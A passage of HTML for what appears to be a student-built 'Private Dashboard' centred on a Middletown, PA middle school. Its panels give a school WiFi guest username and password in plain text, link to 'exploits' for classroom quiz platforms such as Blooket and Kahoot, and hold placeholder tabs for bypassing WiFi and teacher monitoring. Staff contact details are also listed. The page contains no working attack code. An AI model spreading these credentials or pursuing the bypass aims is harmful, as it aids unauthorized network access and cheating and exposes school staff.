      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    #settingsPanel ul, #keybindsPanel ul, #remindersList {
      list-style: none;
      padding: 0;
    }
    #settingsPanel ul li, #keybindsPanel ul li, #remindersList div {
      margin-bottom: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--settings-item-bg);
      padding: 10px;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
      transition: background-color 0.2s, transform 0.1s;
    }
    #settingsPanel ul li:hover, #keybindsPanel ul li:hover, #remindersList div:hover {
        transform: translateY(-2px);
    }
    #settingsPanel ul li span:first-child, #keybindsPanel ul li span:first-child {
        font-weight: bold;
        margin-right: 10px;
        color: var(--text-color-dark);
    }
    #settingsPanel select, #settingsPanel input[type="text"], #keybindsPanel input[type="text"],
    #utilitiesPanel input[type="number"], #remindersPanel input[type="text"], #remindersPanel input[type="datetime-local"] {
      padding: 5px 10px;
      border-radius: 4px;
      border: 1px solid #555;
      background-color: #444;
      color: white;
      flex-grow: 1;
      min-width: 120px;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    #settingsPanel select:focus, #settingsPanel input[type="text"]:focus, #keybindsPanel input[type="text"]:focus,
    #utilitiesPanel input[type="number"]:focus, #remindersPanel input[type="text"]:focus, #remindersPanel input[type="datetime-local"]:focus {
        outline: none;
        border-color: var(--input-focus-border);
        box-shadow: 0 0 5px var(--input-focus-border);
    }

    /* Small button used in settings panel */
    button.small-btn {
        padding: 5px 10px;
        border-radius: 5px;
        background-color: #6c757d;
        color: white;
        border: none;
        cursor: pointer;
        font-size: 0.85em;
        transition: background-color 0.2s, transform 0.1s;
    }
    button.small-btn:hover {
        background-color: #5a6268;
        transform: translateY(-2px);
    }
    button.small-btn:active {
        transform: translateY(0);
    }


    /* Activity Log Entry */
    .activity-log-entry {
        background: var(--activity-log-entry-bg);
        padding: 8px;
        margin-top: 5px;
        border-radius: 6px;
        color: var(--activity-log-entry-text);
        font-size: 0.9em;
        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        word-wrap: break-word; /* Ensure long logs wrap */
    }
    
    #loginActivityLogs {
        max-height: 200px;
        overflow-y: auto;
        margin-top: 15px;
        padding: 5px;
        background: #0d0d0d;
        border-radius: 8px;
        border: 1px solid #444;
        text-align: left;
        color: #ddd; /* Lighter text for log visibility */
    }
    #dashboardActivityLogs, #loginHistoryPanelContent {
      max-height: 400px;
      overflow-y: auto;
      padding-right: 5px;
      padding-top: 5px;
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .quick-bar {
        flex-direction: column;
        align-items: stretch;
      }
      .quick-bar button, .quick-bar input[type="search"] {
        min-width: unset;
        width: 100%;
      }
      .main-row, #updatesNotifications {
        flex-direction: column;
        gap: 15px;
      }
      .login-box, .login-datetime-box {
          width: 95%;
          max-width: 380px;
      }
      #canvasContainer {
          min-width: unset;
          width: 95%;
      }
      #notesCanvas {
          width: 100%;
          height: auto;
          aspect-ratio: 4/3; /* Maintain aspect ratio */
      }
      .wifi-grid, .wifi-entry, .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons, .ipad-options, .school-info-grid {
          grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      }
      .calculator-grid {
          width: 100%;
      }
      .unit-converter-input-group {
          flex-direction: column;
          align-items: stretch;
      }
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Interact.js for drag and resize functionality -->
  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>

</head>
<body class="dark-theme" id="bodyElement">

  <!-- Initial Loading Screen -->
  <div id="initialLoadingScreen" aria-live="polite" aria-atomic="true">
    <div class="rotating-box-container">
      <div class="rotating-box">
        <div class="face front">SYS</div>
        <div class="face back">STEM</div>
        <div class="face right">LOAD</div>
        <div class="face left">ING</div>
        <div class="face top">...</div>
        <div class="face bottom"></div>
      </div>
    </div>
    <div id="loadingText" class="typing-text-container" style="background-image: linear-gradient(to right, orange, red);" aria-label="Initializing system loading indicator">Initializing System...</div>
  </div>

  <!-- Login Page Quick Bar -->
  <div class="login-quick-bar" id="loginQuickBar" style="display:none;" role="toolbar" aria-label="Login quick actions">
    <button id="loginPanicBtn" aria-label="Panic button" title="Panic (Redirect to clever.com)">🚨 Panic</button>
    <button id="loginZoomInBtn" aria-label="Zoom In" title="Zoom In">➕ Zoom In</button>
    <button id="loginZoomOutBtn" aria-label="Zoom Out" title="Zoom Out">➖ Zoom Out</button>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox" role="form" aria-labelledby="loginHeading">
    <h2 id="loginHeading">𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="username" aria-label="Username input" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="current-password" aria-label="Password input" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" aria-label="User ID input" />

    <label for="showPassword" aria-label="Toggle password visibility">
      <span style="flex-grow:1; text-align:left;">Show Password</span>
      <label class="switch" role="switch">
        <input type="checkbox" id="showPassword" aria-checked="false" />
        <span class="slider"></span>
      </label>
    </label>

    <button id="submitBtn" aria-label="Submit login credentials">Submit</button>

    <div class="error-message" id="errorMsg" role="alert" aria-live="assertive"></div>
    <div class="attempt-counter" id="attemptsText" aria-live="polite">Attempts Left: 3</div>

    <button id="viewLoginHistoryBtn" style="margin-top: 15px; background-color: #3498db;" aria-label="View Login Activity Logs" title="View past login attempts and actions">Login Activity Logs</button>
    <div id="loginActivityLogs" aria-label="Recent login activities" role="log"></div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="resetPopupHeading">
      <p id="resetPopupHeading">Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" aria-label="Reset counter password field" />
      <button id="resetBtn" aria-label="Reset attempt counter">Reset Counter</button>
    </div>
  </div>

  <!-- Login Page Date/Time Box -->
  <div class="login-datetime-box" id="loginDateTimeBox" role="timer" aria-live="off">
    <div>
      <span>Current Time:</span> <span id="loginCurrentTime">00:00:00</span>
    </div>
    <div>
      <span>Current Date:</span> <span id="loginCurrentDate">--</span>
    </div>
    <label class="format-toggle" aria-label="Toggle 24-hour time format">
        <span style="user-select:none;">24-hour format</span>
        <label class="switch" role="switch">
          <input type="checkbox" id="toggle24HourFormat" aria-checked="false" />
          <span class="slider"></span>
        </label>
    </label>
  </div>

  <!-- Login Successful Loading Screen -->
  <div id="loginLoadingScreen" style="display:none;" aria-live="polite" aria-atomic="true">
    <div class="rotating-box-container">
        <div class="rotating-box loading-3d-square">
            <div class="face front"></div>
            <div class="face back"></div>
            <div class="face right"></div>
            <div class="face left"></div>
            <div class="face top"></div>
            <div class="face bottom"></div>
        </div>
    </div>
    <div id="loginLoadingScreenText" class="typing-text-container" style="font-family:'Courier New', monospace; font-size:1.5em; font-weight:bold; color:white; margin-top:10px;" aria-label="Loading progress text">Initializing Login Page...</div>
    <div id="codeAnimation" aria-label="Code loading animation"></div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;" role="main">
    <div class="dashboard-header" id="dashboardHeader" role="banner">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box" aria-label="Dashboard version">Version 1.5.6</div>
    </div>

    <div class="quick-bar" id="dashboardQuickBar" role="navigation" aria-label="Dashboard quick navigation">
      <input type="search" id="dashboardSearchBar" placeholder="Search sections..." autocomplete="off" aria-label="Search dashboard sections" title="Search dashboard sections (e.g. settings, calendar)" />
      <button id="sessionTime" aria-label="Current session time" title="Current session time">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock" aria-label="Current real time" title="Current real time">🕒 --:--:--</button>
      <button id="realDate" aria-label="Current date" title="Current date">📅 --</button>
      <button id="notesBtn" aria-label="Open notes canvas" title="Open Notes Canvas">📒 Notes</button>
      <button id="exportNotesBtn" aria-label="Export canvas as image" title="Export Notes Canvas as Image">💾 Export Canvas</button>
      <button id="screenshotBtn" aria-label="Take a screenshot of the dashboard" title="Take Screenshot">📸 Screenshot</button>
      <button id="toggleSectionsBtn" aria-label="Toggle main sections visibility" title="Toggle Main Sections">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn" aria-label="Run diagnostics to fix issues" title="Fix Issues">🛠️ Fix Issues</button>
      <button id="fullScreenBtn" aria-label="Toggle fullscreen mode" title="Fullscreen">🖥️ Full Screen</button>
      <button id="zoomInBtn" aria-label="Zoom In Dashboard" title="Zoom In">➕ Zoom In</button>
      <button id="zoomOutBtn" aria-label="Zoom Out Dashboard" title="Zoom Out">➖ Zoom Out</button>
      <button id="downloadActivityLogsBtn" aria-label="Download all activity logs" title="Download All Activity Logs">⬇️ Download All Logs</button>
      <button id="settingsBtn" aria-label="Open settings panel" title="Settings">⚙️ Settings</button>
      <button id="keybindsBtn" aria-label="Configure keyboard shortcuts" title="Keybinds">⌨️ Keybinds</button>
      <button id="utilitiesBtn" aria-label="Open utilities panel (Timer & Stopwatch)" title="Utilities">⏱️ Utilities</button>
      <button id="calculatorBtn" aria-label="Open calculator" title="Calculator">🧮 Calculator</button>
      <button id="unitConverterBtn" aria-label="Open unit converter" title="Unit Converter">🔄 Unit Converter</button>
      <button id="statsBtn" aria-label="View user statistics" title="Stats">📈 Stats</button>
      <button id="mediaBtn" aria-label="Open media player" title="Media">▶️ Media</button>
      <button id="remindersBtn" aria-label="Set and manage reminders" title="Reminders">⏰ Reminders</button>
      <button id="activityLogsDashboardBtn" aria-label="View dashboard activity logs" title="Dashboard Activity Logs">📝 Dashboard Logs</button>
      <button id="loginHistoryBtn" aria-label="View login history" title="Login History">🔒 Login History</button>
      <button id="restartBtn" aria-label="Restart application" title="Restart">🔄 Restart</button>
      <button id="panicBtn" aria-label="Panic button" title="Panic (Redirect to clever.com)">🚨 Panic</button>
      <button id="themeToggle" aria-label="Toggle dashboard theme" title="Toggle Theme">🌙 Dark Mode</button>
      <button id="logoutBtn" aria-label="Log out of the system" title="Log Out">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar" role="complementary" aria-live="polite">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>

    <!-- Container for dynamic notifications -->
    <div id="dashboardNotificationsContainer" role="status" aria-live="polite" aria-atomic="true"></div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box" id="calendarBox" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>

      <div class="box" id="randomFactBox" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>✨ Random Fact</h2>
        <p id="randomFactContent" aria-live="polite">Loading a fascinating fact...</p>
      </div>
      <div class="box" id="dailyQuoteBox" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📜 Daily Quote</h2>
        <p id="dailyQuoteContent" aria-live="polite">"The only way to do great work is to love what you do." - Steve Jobs</p>
      </div>

    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" id="updatesBox" style="flex: 1 1 300px; min-width: 300px;" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" id="notificationsBox" style="flex: 1 1 300px; min-width: 300px;" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <!-- Group of quick access panels -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;" role="navigation" aria-label="Information panels quick access">
      <button onclick="dashboard.togglePanel('wifiPanel')" title="School WiFi Information">📡 School WiFi</button>
      <button onclick="dashboard.togglePanel('ipadPanel')" title="School iPad Restrictions">📱 School iPad</button>
      <button onclick="dashboard.togglePanel('handbookPanel')" title="Student Handbooks">📘 Handbooks</button>
      <button onclick="dashboard.togglePanel('mapPanel')" title="School Map">🏫 School Map</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')" title="Student Websites">🌐 Student Websites</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')" title="Teacher Websites">👩‍🏫 Teacher Websites</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')" title="School Phone Directory">📞 Phone Directory</button>
      <button onclick="dashboard.togglePanel('cameraPanel')" title="School Camera Information">📷 Cameras</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')" title="School Information">🏫 School Info</button>
      <button onclick="dashboard.togglePanel('exploitPanel')" title="Exploiting Tools">🧨 Exploits</button>
      <button onclick="dashboard.togglePanel('bypassPanel')" title="Bypassing Tools">🚪 Bypasses</button>
      <button onclick="dashboard.togglePanel('vpnPanel')" title="VPN Websites">🔐 VPN</button>
      <button onclick="dashboard.togglePanel('gamingPanel')" title="Gaming Websites">🎮 Gaming</button>
      <button onclick="dashboard.togglePanel('musicPanel')" title="Music Websites">🎵 Music</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')" title="Keyboard Tricks">🎹 Keyboard</button>
    </div>

    <!-- Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid" role="table" aria-label="WiFi Networks">
          <div role="columnheader">Network Name</div>
          <div role="columnheader">Wifi Level</div>
          <div role="columnheader">Security Type</div>
          <div role="columnheader">Encryption</div>
          <div role="columnheader">Hidden?</div>
          <div role="columnheader">Monitored?</div>
          <div role="columnheader">Username</div>
          <div role="columnheader">Password</div>
        </div>
        
        <div class="wifi-entry" role="row">
          <div role="cell">Middletown_Core</div>
          <div role="cell" class="wifi-level-high">High</div>
          <div role="cell">WPA3 Enterprise</div>
          <div role="cell">High</div>
          <div role="cell">No</div>
          <div role="cell">Yes</div>
          <div role="cell">Unknown</div>
          <div role="cell">Unknown</div>
        </div>
        
        <div class="wifi-entry" role="row">
          <div role="cell">Mtown_Core</div>
          <div role="cell" class="wifi-level-high">High</div>
          <div role="cell">WPA3 Enterprise</div>
          <div role="cell">High</div>
          <div role="cell">Yes</div>
          <div role="cell">Unknown</div>
          <div role="cell">Unknown</div>
          <div role="cell">Unknown</div>
        </div>
        
        <div class="wifi-entry" role="row">
          <div role="cell">Mtown Guest</div>
          <div role="cell" class="wifi-level-medium">Medium</div>
          <div role="cell">WPA3 Enterprise</div>
          <div role="cell">Medium</div>
          <div role="cell">No</div>
          <div role="cell">Rare</div>
          <div role="cell">msguest</div>
          <div role="cell">M@ms2021#</div>
        </div>
        
        <div class="wifi-entry" role="row">
          <div role="cell">Radius Test</div>
          <div role="cell" class="wifi-level-low">Low</div>
          <div role="cell">WPA3 Enterprise</div>
          <div role="cell">Low</div>
          <div role="cell">No</div>
          <div role="cell">Rarely</div>
          <div role="cell">msguest</div>
          <div role="cell">M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options" role="tablist">
          <button role="tab" aria-selected="true" onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button role="tab" aria-selected="false" onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content" role="tabpanel" aria-labelledby="ipadRestrictionsTab">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content" role="tabpanel" aria-labelledby="ipadBypassesTab" style="display:none;">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons" role="list">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" title="Elementary Handbook (Jan 2025)" role="listitem">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" title="Secondary Student Handbook (Jan 2025)" role="listitem">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" title="District Handbook" role="listitem">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" title="RA Academy Handbook (Jan 2025)" role="listitem">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" title="Virtual Learning Plan (2024-2025)" role="listitem">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" title="Dress Code (2024-2025)" role="listitem">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list" role="list">
          <a href="https://www.raiderweb.org" target="_blank" role="listitem">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank" role="listitem">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" role="listitem">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" role="listitem">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" role="listitem">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" role="listitem">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank" role="listitem">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank" role="listitem">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank" role="listitem">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" role="listitem">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank" role="listitem">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" role="listitem">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank" role="listitem">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank" role="listitem">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank" role="listitem">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" role="listitem">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list" role="list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank" role="listitem">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank" role="listitem">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank" role="listitem">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1lb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank" role="listitem">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank" role="listitem">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank" role="listitem">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" role="listitem">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" role="listitem">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank" role="listitem">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" role="listitem">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank" role="listitem">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" role="listitem">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank" role="listitem">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" role="listitem">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank" role="listitem">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" role="listitem">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank" role="listitem">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank" role="listitem">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" role="listitem">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank" role="listitem">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank" role="listitem">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank" role="listitem">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank" role="listitem">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank" role="listitem">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" role="listitem">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons" role="list">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" role="listitem">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons" role="tablist">
          <button role="tab" aria-selected="true" onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button role="tab" aria-selected="false" onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button role="tab" aria-selected="false" onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button role="tab" aria-selected="false" onclick="dashboard.showBypassContent('coming1')">Coming Soon 1</button>
          <button role="tab" aria-selected="false" onclick="dashboard.showBypassContent('coming2')">Coming Soon 2</button>
          <button role="tab" aria-selected="false" onclick="dashboard.showBypassContent('coming3')">Coming Soon 3</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content" role="tabpanel">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content" role="tabpanel" style="display:none;">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content" role="tabpanel" style="display:none;">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content" role="tabpanel" style="display:none;">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content" role="tabpanel" style="display:none;">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content" role="tabpanel" style="display:none;">
